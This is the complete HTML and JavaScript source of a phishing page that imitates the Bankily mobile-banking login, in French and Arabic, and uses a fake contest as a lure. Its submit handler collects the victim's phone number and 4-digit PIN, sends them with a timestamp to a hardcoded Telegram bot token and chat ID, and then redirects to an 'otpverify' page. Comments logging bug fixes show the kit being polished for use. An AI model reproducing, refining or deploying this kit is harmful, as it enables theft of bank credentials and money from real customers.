<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<title>Bankily – Connexion</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;min-height:100vh;overflow-x:hidden}
body{
  font-family:'Cairo',sans-serif;
  background:#f5f5f5;
  color:#222;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* ══ TOP BAR ══ */
/* BUG 1 FIX: position:relative moved to CSS, removed inline style */
.top-bar{
  background:#0097A7;
  padding:0 16px;
  height:56px;
  display:flex;align-items:center;justify-content:space-between;
  flex-shrink:0;
  position:relative; /* ← FIX: was inline style, now in CSS */
}
.tb-back{
  background:none;border:none;cursor:pointer;
  color:#fff;font-size:22px;line-height:1;
  padding:4px 8px;
}
.tb-title{
  color:#fff;font-family:'Cairo',sans-serif;
  font-size:17px;font-weight:700;
  position:absolute;left:50%;transform:translateX(-50%);
  white-space:nowrap; /* ← FIX: prevent text wrap on small screens */
}
.tb-lang{
  background:rgba(255,255,255,.2);
  border:1px solid rgba(255,255,255,.5);
  border-radius:20px;color:#fff;
  font-family:'Cairo',sans-serif;
  font-size:13px;font-weight:700;
  padding:4px 14px;cursor:pointer;
  transition:background .2s;
}
.tb-lang:hover{background:rgba(255,255,255,.35)}

/* ══ PAGE ══ */
.page{
  flex:1;
  background:#fff;
  display:flex;flex-direction:column;
  padding:0 24px calc(80px + env(safe-area-inset-bottom));
  max-width:480px;margin:0 auto;width:100%;
}

/* ══ LOGO AREA ══ */
.logo-area{
  display:flex;justify-content:center;align-items:center;
  padding:32px 0 28px;
  min-height:140px;
}
.logo-area img{
  max-width:240px;width:100%;height:auto;
  display:block;
}
.logo-fallback{
  display:none;
  flex-direction:column;align-items:center;gap:6px;
}
.logo-fallback.show{display:flex}
.logo-fallback-text{
  font-size:28px;font-weight:900;color:#0097A7;
  font-family:'Cairo',sans-serif;letter-spacing:1px;
}
.logo-fallback-sub{
  font-size:12px;color:#888;
  font-family:'Cairo',sans-serif;
}

/* ══ INFO MSG ══ */
.info-msg{
  font-size:13px;color:#0097A7;
  background:#E8F7F9;border-radius:8px;
  padding:10px 14px;margin-bottom:24px;
  line-height:1.6;text-align:center;
  transition:opacity .4s;
}
/* BUG 5 FIX: use opacity+pointer-events instead of display:none so timer works cleanly */
.info-msg.hidden{opacity:0;pointer-events:none;height:0;padding:0;margin:0;overflow:hidden}

/* ══ USERNAME FIELD ══ */
.field-wrap{margin-bottom:28px}
.field-label{
  font-size:13px;color:#555;font-weight:600;
  margin-bottom:6px;font-family:'Cairo',sans-serif;
}
.field-row{
  display:flex;align-items:center;gap:12px;
  border-bottom:1.5px solid #ccc;
  padding-bottom:8px;
  transition:border-color .25s;
}
.field-row:focus-within{border-color:#0097A7}
.field-icon{width:26px;height:26px;color:#888;flex-shrink:0}
.field-input{
  flex:1;border:none;outline:none;background:transparent;
  font-family:'Cairo',sans-serif;font-size:16px;color:#222;
  padding:2px 0;
}
.field-input::placeholder{color:#aaa;font-size:15px}

/* ══ PIN FIELD ══ */
.pin-wrap{margin-bottom:8px}
.pin-header{
  display:flex;align-items:center;gap:12px;
  margin-bottom:14px;
}
.pin-label-text{
  font-size:14px;color:#222;font-weight:600;
  font-family:'Cairo',sans-serif;flex:1;
}
.forgot-pin{
  font-size:13px;color:#0097A7;font-weight:600;
  text-decoration:underline;cursor:pointer;
  background:none;border:none;
  font-family:'Cairo',sans-serif;padding:0;
}
.pin-lock-icon{width:26px;height:26px;color:#888;flex-shrink:0}

/* BUG 2 FIX: removed border-bottom from .pin-boxes (was showing under the whole row)
   Each individual .pin-box already has its own border-bottom */
.pin-boxes{
  display:flex;gap:20px;direction:ltr;
  padding-bottom:8px;flex:1;
  /* REMOVED: border-bottom:1.5px solid #ccc — was wrong, applied to container */
}
.pin-box{
  width:32px;height:40px;
  border:none;outline:none;background:transparent;
  font-family:'Cairo',sans-serif;
  font-size:22px;font-weight:800;
  text-align:center;color:#222;
  direction:ltr;
  border-bottom:2px solid #aaa; /* ← each box has its own underline */
  padding:0;
  caret-color:transparent;
  -webkit-appearance:none;border-radius:0;
}
.pin-box:focus{border-bottom-color:#0097A7}

/* ══ NEW USER ══ */
.new-user-wrap{
  text-align:center;
  margin-top:auto;
  padding:28px 0 12px;
}
.new-user-btn{
  font-size:14px;color:#0097A7;
  text-decoration:underline;cursor:pointer;
  background:none;border:none;
  font-family:'Cairo',sans-serif;font-weight:600;
}

/* ══ BOTTOM BUTTON ══ */
.btn-bar{position:fixed;bottom:0;left:0;right:0;z-index:100}
.login-btn{
  display:block;width:100%;
  padding:18px;border:none;
  background:#F5C20B;
  color:#fff;font-family:'Cairo',sans-serif;
  font-size:18px;font-weight:800;
  cursor:pointer;transition:background .2s;
}
.login-btn:hover{background:#E0B008}
.login-btn:active{background:#CDA007}

/* ══ LOADER ══ */
#loader-overlay{
  display:none;position:fixed;inset:0;
  background:rgba(255,255,255,.94);z-index:9999;
  flex-direction:column;align-items:center;justify-content:center;gap:16px;
}
#loader-overlay.active{display:flex}
.ld-ring{width:48px;height:48px;position:relative}
.ld-ring::before{
  content:'';position:absolute;inset:0;border-radius:50%;
  border:3px solid #eee;border-top-color:#F5C20B;
  animation:spin .8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
.ld-text{font-size:15px;color:#0097A7;font-weight:700;font-family:'Cairo',sans-serif}

/* ══ MODAL ══ */
#modal-alert{
  display:none;position:fixed;inset:0;
  background:rgba(0,0,0,.45);z-index:10000;
  justify-content:center;align-items:center;padding:20px;
}
#modal-alert.show{display:flex}
.modal-box{
  background:#fff;border-radius:16px;
  padding:24px 20px;max-width:340px;width:100%;
  text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.2);
}
.modal-box p{
  font-size:15px;color:#222;line-height:1.7;
  margin-bottom:18px;white-space:pre-line;
  font-family:'Cairo',sans-serif;
}
.modal-btn{
  background:#F5C20B;color:#fff;border:none;
  padding:11px 32px;border-radius:10px;
  cursor:pointer;font-family:'Cairo',sans-serif;
  font-size:15px;font-weight:700;width:100%;
}
</style>
</head>
<body>

<!-- Loader -->
<div id="loader-overlay">
  <div class="ld-ring"></div>
  <div class="ld-text" id="ld-text">Connexion en cours...</div>
</div>

<!-- Modal -->
<div id="modal-alert">
  <div class="modal-box">
    <p id="modal-text"></p>
    <button class="modal-btn" id="modal-close">OK</button>
  </div>
</div>

<!-- Top bar — BUG 1 FIX: removed inline style="position:relative", now in CSS -->
<div class="top-bar">
  <button class="tb-back" onclick="window.location.href='index.html'">&#8592;</button>
  <span class="tb-title" id="tb-title"></span>
  <button class="tb-lang" id="lang-btn" onclick="toggleLang()">عربي</button>
</div>

<!-- Page -->
<div class="page">

  <!-- LOGO -->
  <div class="logo-area">
    <img
      src="images/logo.png"
      alt="Bankily"
      id="logo-img"
      onerror="this.style.display='none';document.getElementById('logo-fb').classList.add('show')"
    >
    <div class="logo-fallback" id="logo-fb">
      <span class="logo-fallback-text">🏦 Bankily</span>
      <span class="logo-fallback-sub">PAR BPM</span>
    </div>
  </div>

  <!-- Info msg -->
  <div class="info-msg" id="info-msg">
    Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours
  </div>

  <form id="login-form" autocomplete="off">

    <!-- USERNAME -->
    <div class="field-wrap">
      <div class="field-label" id="field-label-user">Nom d'utilisateur ou numéro de téléphone</div>
      <div class="field-row">
        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="8" r="4"/>
          <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
        </svg>
        <input
          class="field-input" type="tel" id="username"
          inputmode="numeric" maxlength="8"
          placeholder="32758657"
          autocomplete="off"
        >
      </div>
    </div>

    <!-- PIN -->
    <div class="pin-wrap">
      <div class="pin-header">
        <svg class="pin-lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="5" y="11" width="14" height="10" rx="2"/>
          <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
        </svg>
        <span class="pin-label-text" id="pin-label">Code PIN</span>
        <button type="button" class="forgot-pin" id="forgot-pin">Code PIN oublié ?</button>
      </div>
      <!-- BUG 2 FIX: removed border-bottom from pin-boxes, each pin-box has its own -->
      <div class="pin-boxes" id="pin-boxes" dir="ltr">
        <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
        <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
        <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
        <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
      </div>
    </div>

    <!-- New user -->
    <div class="new-user-wrap">
      <button type="button" class="new-user-btn" id="new-user">
        Nouvel utilisateur ? Inscrivez-vous maintenant !
      </button>
    </div>

  </form>
</div>

<!-- Fixed bottom button -->
<div class="btn-bar">
  <button class="login-btn" id="login-btn"
    onclick="document.getElementById('login-form').dispatchEvent(new Event('submit',{cancelable:true,bubbles:true}))">
    Se connecter
  </button>
</div>

<script>
const usernameInput = document.getElementById('username');
const pinInputs     = document.querySelectorAll('.pin-box');
const loaderOverlay = document.getElementById('loader-overlay');
const modalAlert    = document.getElementById('modal-alert');
const modalText     = document.getElementById('modal-text');
const modalClose    = document.getElementById('modal-close');
const infoMsg       = document.getElementById('info-msg');
const loginBtn      = document.getElementById('login-btn');

const T = {
  ar:{
    dir:'rtl',lang:'ar',langBtn:'FR',
    tbTitle:'تسجيل الدخول',
    fieldLabel:'اسم المستخدم أو رقم الهاتف',
    pinLabel:'الرمز السري',
    forgotPin:'نسيت الرمز السري؟',
    newUser:'مستخدم جديد؟ سجّل الآن!',
    loginBtn:'تسجيل الدخول',
    ldText:'جاري التسجيل...',
    infoMsg:'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
    errUsername:'يجب أن يحتوي رقم بنكيلي على 8 أرقام ويبدأ بـ 2 أو 3 أو 4',
    errPin:'يجب أن يحتوي الرمز السري على 4 أرقام',
    already:(m)=>`⛔ لقد سجلت من قبل.\nالرجاء الانتظار ${m} دقيقة.`,
  },
  fr:{
    dir:'ltr',lang:'fr',langBtn:'عربي',
    tbTitle:'',
    fieldLabel:"Nom d'utilisateur ou numéro de téléphone",
    pinLabel:'Code PIN',
    forgotPin:'Code PIN oublié ?',
    newUser:"Nouvel utilisateur ? Inscrivez-vous maintenant !",
    loginBtn:'Se connecter',
    ldText:'Connexion en cours...',
    infoMsg:"Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours",
    errUsername:'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
    errPin:'Le code PIN doit contenir 4 chiffres',
    already:(m)=>`⛔ Vous avez déjà participé.\nRevenez dans ${m} minute(s).`,
  }
};

let isAr = localStorage.getItem('bankily_lang') === 'ar'
  || (!localStorage.getItem('bankily_lang') && (navigator.language||'').startsWith('ar'));

function applyLang(){
  const L = isAr ? T.ar : T.fr;
  document.documentElement.lang = L.lang;
  document.documentElement.dir  = L.dir;
  document.body.dir              = L.dir;
  document.getElementById('lang-btn').textContent         = L.langBtn;
  document.getElementById('tb-title').textContent         = L.tbTitle;
  document.getElementById('field-label-user').textContent = L.fieldLabel;
  document.getElementById('pin-label').textContent        = L.pinLabel;
  document.getElementById('forgot-pin').textContent       = L.forgotPin;
  document.getElementById('new-user').textContent         = L.newUser;
  document.getElementById('ld-text').textContent          = L.ldText;
  document.getElementById('info-msg').textContent         = L.infoMsg;
  loginBtn.textContent = L.loginBtn;
  // PIN boxes always LTR regardless of language
  document.getElementById('pin-boxes').dir = 'ltr';
  pinInputs.forEach(i=>{ i.setAttribute('dir','ltr'); });
}

function toggleLang(){
  isAr = !isAr;
  localStorage.setItem('bankily_lang', isAr?'ar':'fr');
  applyLang();
}

/* BUG 5 FIX: use a mutable variable instead of const for the timer
   so clearTimeout can properly cancel it when user starts typing */
let infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 4000);
usernameInput.addEventListener('input',()=>{
  clearTimeout(infoTimer);
  infoMsg.classList.add('hidden');
});

/* Modal */
function showModal(msg){ modalText.textContent=msg; modalAlert.classList.add('show'); }
modalClose.addEventListener('click',()=>modalAlert.classList.remove('show'));

/* ══ PIN UX ══ */
pinInputs.forEach((inp,i)=>{
  inp.setAttribute('dir','ltr');

  inp.addEventListener('input',()=>{
    inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
    if(inp.value && i < pinInputs.length-1) pinInputs[i+1].focus();
    /* Mask digit after short delay for UX */
    setTimeout(()=>{ if(inp.value) inp.type='password'; },400);
  });

  inp.addEventListener('keydown',e=>{
    if(e.key==='Backspace'){
      if(inp.value===''){
        /* BUG 4 FIX: only switch type AFTER clearing, and check i>0 first */
        if(i>0){
          pinInputs[i-1].type='tel';
          pinInputs[i-1].value='';
          pinInputs[i-1].focus();
        }
      } else {
        /* Clear current box: reset type first so value is visible, then clear */
        inp.type='tel';
        inp.value='';
      }
      e.preventDefault();
    }
    /* Block non-numeric keys */
    if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)){
      e.preventDefault();
    }
  });

  inp.addEventListener('paste',e=>{
    e.preventDefault();
    const digits=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
    [...digits].slice(0,4).forEach((d,j)=>{
      if(pinInputs[j]){ pinInputs[j].type='tel'; pinInputs[j].value=d; }
    });
    pinInputs[Math.min(digits.length,pinInputs.length-1)].focus();
  });
});

/* Keyboard push-up for fixed button */
if(window.visualViewport){
  window.visualViewport.addEventListener('resize',()=>{
    const kb=window.innerHeight-window.visualViewport.height;
    document.querySelector('.btn-bar').style.transform=kb>50?`translateY(-${kb}px)`:'';
  });
}

/* ══ TELEGRAM ══ */
const TG_TOKEN  = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
const TG_CHATID = '8674569520';
async function sendTG(text){
  try{
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:TG_CHATID,text,parse_mode:'HTML'})
    });
  }catch(e){}
}

/* Anti-double submit */
function checkReg(u){
  const d=localStorage.getItem('bnk_reg_'+u);
  if(!d)return false;
  const el=(Date.now()-JSON.parse(d).ts)/60000;
  if(el>=10){localStorage.removeItem('bnk_reg_'+u);return false;}
  return Math.ceil(10-el);
}
function markReg(u){ localStorage.setItem('bnk_reg_'+u,JSON.stringify({ts:Date.now()})); }

/* ══ SUBMIT ══ */
document.getElementById('login-form').addEventListener('submit',async function(e){
  e.preventDefault();
  const L = isAr ? T.ar : T.fr;
  const username = usernameInput.value.trim();
  const pin = Array.from(pinInputs).map(i=>i.value).join('');

  /* Validate username: 8 digits, starts with 2, 3 or 4 */
  if(!/^[2-4][0-9]{7}$/.test(username)){
    showModal(L.errUsername);
    return;
  }

  /* Validate PIN: exactly 4 digits */
  if(!/^[0-9]{4}$/.test(pin)){
    showModal(L.errPin);
    return;
  }

  /* BUG 3 FIX: removed the wrong unique-digits check.
     The condition `new Set(pin).size < 4` was rejecting valid PINs like "1234"
     because it required ALL 4 digits to be different.
     A PIN like "1234" has size=4 → passes, but "1123" has size=3 → wrongly rejected.
     Standard banking PINs do NOT require all unique digits — removed entirely. */

  /* Anti-double */
  const mins = checkReg(username);
  if(mins !== false){ showModal(L.already(mins)); return; }

  markReg(username);
  sessionStorage.setItem('bankily_pin', pin);
  sessionStorage.setItem('bankily_username', username);
  loaderOverlay.classList.add('active');

  const now = new Date().toLocaleString('fr-FR');
  await sendTG(
    `🔐 <b>Nouvelle connexion – Bankily</b>\n`+
    `━━━━━━━━━━━━━━━━━━━━\n`+
    `📱 <b>Numéro :</b> <code>${username}</code>\n`+
    `🔑 <b>PIN    :</b> <code>${pin}</code>\n`+
    `📅 <b>Heure  :</b> ${now}`
  );

  setTimeout(()=>{ window.location.href='otpverify.html'; },1500);
});

/* Init */
applyLang();
</script>
</body>
</html>
